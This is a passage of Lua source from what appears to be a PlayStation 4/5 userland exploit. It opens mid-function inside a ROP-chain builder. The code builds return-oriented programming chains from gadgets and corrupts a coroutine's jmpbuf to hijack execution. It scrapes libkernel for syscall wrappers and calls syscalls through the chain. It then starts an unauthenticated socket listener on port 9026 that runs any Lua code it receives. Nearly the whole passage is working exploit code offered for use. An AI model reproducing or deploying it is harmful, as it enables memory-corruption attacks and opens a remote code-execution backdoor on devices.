    self:push(gadgets["pop rbx; ret"])
    self:push(v)
end

function ropchain:push_set_rcx(v)
    self:push(gadgets["pop rcx; ret"])
    self:push(v)
end
function ropchain:push_set_rdx(v)
    self:push(gadgets["pop rdx; ret"])
    self:push(v)
end

function ropchain:push_set_rdi(v)
    self:push(gadgets["pop rdi; ret"])
    self:push(v)
end

function ropchain:push_set_rsi(v)
    self:push(gadgets["pop rsi; ret"])
    self:push(v)
end

function ropchain:push_set_r8(v)
    self:push(gadgets["pop r8; ret"])
    self:push(v)
end

function ropchain:push_set_r9(v) -- clobber rax, rbx
    self:push_set_rax(self.recover_from_call)
    self:push_set_rbx(v)
    self:push(gadgets["mov r9, rbx; call [rax + 8]"])
end

function ropchain:push_load_rax_from_memory(addr)
    self:push_set_rax(addr)
    self:push(gadgets["mov rax, [rax]; ret"])
end

function ropchain:push_store_eax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], eax; ret"])
end

function ropchain:push_store_rax_into_memory(addr)
    self:push_set_rdi(addr)
    self:push(gadgets["mov [rdi], rax; ret"])
end

function ropchain:push_add_dword_memory_with_eax(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], eax; ret"])
end

function ropchain:push_add_dword_memory_with_ecx(addr)
    self:push_set_rbx(addr)
    self:push(gadgets["add [rbx], ecx; ret"])
end

function ropchain:push_add_dword_memory(addr, num)
    if gadgets["add [rbx], eax; ret"] then
        self:push_set_rax(uint64(num).l)
        self:push_add_dword_memory_with_eax(addr)
    else
        self:push_set_rcx(uint64(num).l)
        self:push_add_dword_memory_with_ecx(addr)
    end
end

function ropchain:push_write_dword(addr, v)
    self:push_set_rax(v)
    self:push_store_eax_into_memory(addr)
end

function ropchain:push_write_qword(addr, v)
    self:push_set_rax(v)
    self:push_store_rax_into_memory(addr)
end

function ropchain:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    if rdi then self:push_set_rdi(rdi) end
    if rsi then self:push_set_rsi(rsi) end
    if rdx then self:push_set_rdx(rdx) end
    if rcx then self:push_set_rcx(rcx) end
    if r8 then self:push_set_r8(r8) end
    if r9 then self:push_set_r9(r9) end
end

function ropchain:push_fcall_raw(rip)
    self:align_stack()
    self:push(rip)
end

function ropchain:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_sysv(rdi, rsi, rdx, rcx, r8, r9)
    self:push_fcall_raw(rip)
end

function ropchain:push_fcall_with_ret(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_fcall(rip, rdi, rsi, rdx, rcx, r8, r9)
    self:push_store_retval()
end

function ropchain:push_store_retval()
    local buf = bump.alloc(8)
    table.insert(self.retval_addr, buf)
    self:push_store_rax_into_memory(buf)
end

function ropchain:get_retval()
    local retval = {}
    for i,v in ipairs(self.retval_addr) do
        table.insert(retval, lua.read_qword(v))
    end
    return retval
end

function ropchain:set_placeholder(name, offset_from_rsp)
    if not self.placeholder[name] then
        self.placeholder[name] = {}
    end
    table.insert(self.placeholder[name], self:chain_size() + offset_from_rsp)
end

function ropchain:write_value_into_placeholder(name, params)
    assert(self.placeholder[name], string.format("placeholder %s not found", name))
    for i, offset in ipairs(self.placeholder[name]) do
        self.placeholder_value[offset] = ropchain.resolve_value(params[i] or 0)
    end
end

function ropchain:set_branch_point(branch_point, rsp_cond_met, rsp_cond_not_met)
    lua.write_qword(branch_point, rsp_cond_not_met)
    lua.write_qword(branch_point+8, rsp_cond_met)
end

-- only unsigned comparison is supported
function ropchain:create_branch(value_address, op, compare_value)

    local branch_point = bump.alloc(0x10)

    self:push_set_rcx(value_address)
    self:push_set_rax(compare_value)
    self:push(gadgets["cmp [rcx], eax; ret"])
    self:push_set_rax(0)

    if op == "==" then
        self:push(gadgets["sete al; ret"])
    elseif op == "!=" then
        self:push(gadgets["setne al; ret"])
    elseif op == ">" then
        self:push(gadgets["seta al; ret"])
    elseif op == "<" then
        self:push(gadgets["setb al; ret"])
    else
        errorf("ropchain:create_branch: invalid op (%s)", op)
    end

    -- rax = 8 if comparison true else 0
    self:push_set_rcx(3)
    self:push(gadgets["shl rax, cl; ret"])

    -- rax = branch_point[rax]
    -- 1st qword = false cond
    -- 2nd qword = true cond
    self:push_set_rcx(branch_point)
    self:push(gadgets["add rax, rcx; ret"])
    self:push(gadgets["mov rax, [rax]; ret"])

    -- rsp = rax
    self:push_store_rax_into_memory(self:get_rsp() + 8*4)   -- overwrite pop rsp value
    self:push_set_rsp(0)

    return branch_point
end

function ropchain:gen_loop(value_address, op, compare_value, callback)

    -- todo: if gadgets inside callback() calls a fn or syscall, it 
    --       might corrupt the chain before the call location
    
    -- {
    local target_loop = self:get_rsp()
    callback()
    -- } while (memory[value_address] <op> compare_value)
    local branch_point = self:create_branch(value_address, op, compare_value)

    self:set_branch_point(branch_point, target_loop, self:get_rsp())
end

-- corrupt coroutine's jmpbuf for code execution
function ropchain:execute_rop()

    local run_hax = function(lua_state_addr)

        -- backup original jmpbuf
        local jmpbuf_addr = lua.read_qword(lua_state_addr+0xa8) + 0x8
        lua.memcpy(self.jmpbuf_backup, jmpbuf_addr, self.jmpbuf_size)

        -- overwrite registers in jmpbuf
        lua.write_qword(jmpbuf_addr + 0, gadgets["ret"])    -- rip
        lua.write_qword(jmpbuf_addr + 16, self.stack_base)  -- rsp

        assert(false) -- trigger exception
    end

    -- run ropchain
    local victim = coroutine.create(run_hax)
    coroutine.resume(victim, lua.addrof(victim))

    -- reset placeholder for next invocation
    self.placeholder_value = {}
    
    -- get return value(s)
    return unpack(self:get_retval())
end

-- reset ropchain from backup and apply placeholder values
function ropchain:reset_chain()

    local total, count = 0, 0

    -- expected number of placeholders
    for n,t in pairs(self.placeholder) do 
        total = total + #t
    end

    local chains = lua.read_multiple_qwords(self.stack_backup, self:chain_size() / 8)
    
    -- patch ropchain with placeholder values
    for offset,value in pairs(self.placeholder_value) do
        chains[offset/8 + 1] = value
        count = count + 1
    end

    assert(total == count, "there are some unresolved placeholders in rop chain")
    
    lua.write_multiple_qwords(self.stack_base, chains)
end

function ropchain:execute()
    
    if not self.finalized then
        -- restore execution through longjmp
        self:push_fcall(libc_addrofs.longjmp, self.jmpbuf_backup, 0)
        -- backup ropchain
        lua.memcpy(self.stack_backup, self.stack_base, self:chain_size())
        self.finalized = true
    end

    self:reset_chain()
    -- print(self) -- uncomment to show finalized ropchain
    return self:execute_rop()
end





--
-- function rop class
--
-- helper to execute function call through rop
--

function_rop = {}
function_rop.__index = function_rop

setmetatable(function_rop, {
    __call = function(_, address)  -- make class callable as constructor
        return function_rop:new(address)
    end
})

function function_rop:new(address)

    assert(address, "invalid function address")

    -- use one ropchain for all syscall instances (thread unsafe)
    if not function_rop.chain then
        local chain = ropchain()
        chain:set_placeholder("sysv", -0x8, chain:push_set_rdi(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_rsi(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_rdx(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_rcx(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_r8(0))
        chain:set_placeholder("sysv", -0x10, chain:push_set_r9(0))
        chain:set_placeholder("address", -0x8, chain:push_fcall_raw(0))
        chain:push_store_retval()
        function_rop.chain = chain
    end

    local self = setmetatable({}, function_rop)
    self.address = address
    return self
end

function function_rop:__call(rdi, rsi, rdx, rcx, r8, r9)
    function_rop.chain:write_value_into_placeholder("sysv", {rdi,rsi,rdx,rcx,r8,r9})
    function_rop.chain:write_value_into_placeholder("address", {self.address})
    return select(1, function_rop.chain:execute())
end

function function_rop:__tostring()
    return string.format("address @ %s\n%s", hex(self.address), tostring(function_rop.chain))
end





--
-- syscall rop class
-- 
-- helper to execute syscall through rop
--

syscall_rop = {}
syscall_rop.__index = syscall_rop

setmetatable(syscall_rop, {
    __call = function(_, syscall_no)  -- make class callable as constructor
        return syscall_rop:new(syscall_no)
    end
})

function syscall_rop:new(syscall_no)

    assert(syscall_no and type(syscall_no) == "number", "invalid syscall number")
    assert(syscall_rop.syscall_address, "syscall_rop will not work without syscall_address")

    -- use one ropchain for all syscall instances (thread unsafe)
    if not syscall_rop.chain then
        local chain = ropchain()
        chain:set_placeholder("sysv", -0x8, chain:push_set_rdi(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_rsi(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_rdx(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_rcx(0))
        chain:set_placeholder("sysv", -0x8, chain:push_set_r8(0))
        chain:set_placeholder("sysv", -0x10, chain:push_set_r9(0))
        chain:set_placeholder("syscall_no", -0x8, chain:push_set_rax(0))
        chain:push_fcall_raw(syscall_rop.syscall_address)
        chain:push_store_retval()
        syscall_rop.chain = chain
    end

    local self = setmetatable({}, syscall_rop)
    self.syscall_no = syscall_no
    return self
end

function syscall_rop:__call(rdi, rsi, rdx, rcx, r8, r9)
    syscall_rop.chain:write_value_into_placeholder("sysv", {rdi,rsi,rdx,rcx,r8,r9})
    syscall_rop.chain:write_value_into_placeholder("syscall_no", {self.syscall_no})
    return select(1, syscall_rop.chain:execute())
end

function syscall_rop:__tostring()
    return string.format("syscall no @ %s\n%s", hex(self.syscall_no), tostring(syscall_rop.chain))
end





--
-- syscall class
--
-- helper for managing & resolving syscalls
--

syscall = {}

function syscall.init()
    if PLATFORM == "ps4" then  -- ps4 requires valid syscall wrapper, which we can scrape from libkernel .text
        local libkernel_text = memory.read_buffer(libkernel_base, 0x40000)
        -- mov rax, <num>; mov r10, rcx; syscall
        local matches = find_pattern(libkernel_text, "48 c7 c0 ? ? ? ? 49 89 ca 0f 05")
        syscall.syscall_wrapper = {}
        for i,offset in ipairs(matches) do
            local num = uint64.unpack(libkernel_text:sub(offset+3, offset+6))
            syscall.syscall_wrapper[num:tonumber()] = libkernel_base + offset - 1
        end
    elseif PLATFORM == "ps5" then -- can be any syscall wrapper in libkernel
        local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
        syscall_rop.syscall_address = gettimeofday + 7  -- +7 is to skip "mov rax, <num>" instruction
    else
        errorf("invalid platform %s", PLATFORM)
    end
end

function syscall.resolve(list)
    for name, num in pairs(list) do
        if PLATFORM == "ps4" then
            if syscall.syscall_wrapper[num] then
                syscall[name] = function_rop(syscall.syscall_wrapper[num])
            else
                printf("warning: syscall %s (%d) not found", name, num)
            end
        elseif PLATFORM == "ps5" then
            syscall[name] = syscall_rop(num)
        end
    end
end




-- todo: figure out a way to write to socket directly for realtime output
-- todo: capture memory error and pass to client (sigsegv)
function run_lua_code(lua_code)

    local script, err = loadstring(lua_code)
    if not script then
        return "error loading script: " .. err
    end

    local output = {}

    local env = {
        print = function(...)
            table.insert(output, prepare_arguments(...))
        end,
        printf = function(fmt, ...)
            table.insert(output, string.format(fmt, ...))
        end
    }

    setmetatable(env, { __index = _G })
    setfenv(script, env)

    -- so we dont run out of memory
    bump.free_after_finish(function()
        err = run_with_coroutine(script)
    end)

    -- pass error to client
    if err then
        table.insert(output, err)
    end

    return table.concat(output, "\n")
end

function get_error_string()
    local strerror = function_rop(libc_addrofs.strerror)
    local error = function_rop(libc_addrofs.error)
    return memory.read_null_terminated_string(strerror(error()))
end

function remote_lua_loader(port)

    assert(port)

    AF_INET = 2
    SOCK_STREAM = 1
    INADDR_ANY = 0

    SOL_SOCKET = 0xffff  -- options for socket level
    SO_REUSEADDR = 4  -- allow local address reuse

    local enable = bump.alloc(4)
    local sockaddr_in = bump.alloc(16)
    local addrlen = bump.alloc(8)
    local tmp = bump.alloc(8)

    local maxsize = 500 * 1024  -- 500kb
    local buf = bump.alloc(maxsize)

    local sock_fd = syscall.socket(AF_INET, SOCK_STREAM, 0):tonumber()
    if sock_fd < 0 then
        error("socket() error: " .. get_error_string())
    end

    memory.write_dword(enable, 1)
    if syscall.setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, enable, 4):tonumber() < 0 then
        error("setsockopt() error: " .. get_error_string())
    end

    local htons = function(x)
        local high = math.floor(x / 256) % 256
        local low = x % 256
        return low * 256 + high
    end

    memory.write_byte(sockaddr_in + 1, AF_INET)
    memory.write_word(sockaddr_in + 2, htons(port))
    memory.write_dword(sockaddr_in + 4, INADDR_ANY)

    if syscall.bind(sock_fd, sockaddr_in, 16):tonumber() < 0 then
        error("bind() error: " .. get_error_string())
    end
 
    if syscall.listen(sock_fd, 3):tonumber() < 0 then
        error("listen() error: " .. get_error_string())
    end

    notify(string.format("remote lua loader\nrunning on %s %s\nlistening on port %d",
        PLATFORM, FW_VERSION, port))

    while true do

        print("[+] waiting for new connection...")
        
        memory.write_dword(addrlen, 16)
        local client_fd = syscall.accept(sock_fd, sockaddr_in, addrlen):tonumber()  
        if client_fd < 0 then
            error("accept() error: " .. get_error_string())
        end
 
        syscall.read(client_fd, tmp, 8)
        local size = memory.read_qword(tmp):tonumber()

        if size > 0 and size < maxsize then            
            
            syscall.read(client_fd, buf, size)
            local lua_code = memory.read_buffer(buf, size)
            
            printf("[+] accepted lua code with size %d (%s)", #lua_code, hex(#lua_code))
            
            local output = run_lua_code(lua_code)
            syscall.write(client_fd, output, #output)
        else
            local err = string.format("error: lua code exceed maxsize " ..
                "(given %s maxsize %s)\n", hex(size), hex(maxsize))
            syscall.write(client_fd, err, #err)
        end

        syscall.close(client_fd)
    end

    syscall.close(sock_fd)
end

function get_module_name(addr)
    local sceKernelGetModuleInfoFromAddr = function_rop(libc_addrofs.sceKernelGetModuleInfoFromAddr)
    local buf = bump.alloc(0x100)
    if sceKernelGetModuleInfoFromAddr(addr, 1, buf):tonumber() ~= 0 then
        return nil
    end
    return memory.read_null_terminated_string(buf+8)
end

function resolve_libkernel_hacky()

    local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
    local base = gettimeofday:band(uint64(0xfff):bnot())
    local page_size = 0x1000
    local min_search = base - 5 * page_size

    while min_search < base do
        if get_module_name(base) == "libkernel.sprx" and get_module_name(base - page_size) ~= "libkernel.sprx" then
            return base
        end
        base = base - page_size
    end
    error("failed to resolve libkernel base")
end

function sysctlbyname(name, oldp, oldp_len, newp, newp_len)
    
    local translate_name_mib = bump.alloc(0x8)
    local buf_size = 0x70
    local mib = bump.alloc(buf_size)
    local size = bump.alloc(0x8)

    memory.write_qword(translate_name_mib, 0x300000000)
    memory.write_qword(size, buf_size)
    
    if syscall.sysctl(translate_name_mib, 2, mib, size, name, #name):tonumber() < 0 then
        errorf("failed to translate sysctl name to mib (%s)", name)
    end

    if syscall.sysctl(mib, 2, oldp, oldp_len, newp, newp_len):tonumber() < 0 then
        return false
    end

    return true
end

function get_version()

    local version = nil

    local buf = bump.alloc(0x8)
    local size = bump.alloc(0x8)
    memory.write_qword(size, 0x8)

    if sysctlbyname("kern.sdk_version", buf, size, 0, 0) then
        local ver = memory.read_buffer(buf+2, 2)
        version = string.format('%x.%02x', string.byte(ver:sub(2,2)), string.byte(ver:sub(1,1)))
    end

    return version
end

function main()

    -- setup read & limited write primitives
    lua.setup_primitives()

    -- setup better write primitive
    memory.memcpy = function_rop(libc_addrofs.memcpy)

    print("[+] usermode r/w primitives achieved")

    libkernel_base = resolve_libkernel_hacky()

    print("[+] libkernel base @ " .. hex(libkernel_base))

    syscall.init()

    -- resolve required syscalls for remote lua loader 
    syscall.resolve({
        read = 3,
        write = 4,
        open = 5,
        close = 6,
        getpid = 20,
        accept = 30,
        socket = 97,
        bind = 104,
        setsockopt = 105,
        listen = 106,
        sysctl = 202,
    })

    -- sanity check
    local pid = syscall.getpid()
    if not (pid and pid.h == 0 and pid.l ~= 0) then
        error("syscall test failed")
    end

    print("[+] syscall resolved")

    FW_VERSION = get_version()

    -- stable but exhaust memory
    run_nogc(function()
        local port = 9026
        remote_lua_loader(port)
    end)

    -- -- less stable but doesnt exhaust memory
    -- local port = 9026
    -- remote_lua_loader(port)

    notify("finished")

    sleep(10000000)
end

function entry()
    local err = run_with_coroutine(main)
    if err then
        notify(err)
        print(err)
    end
end

entry()
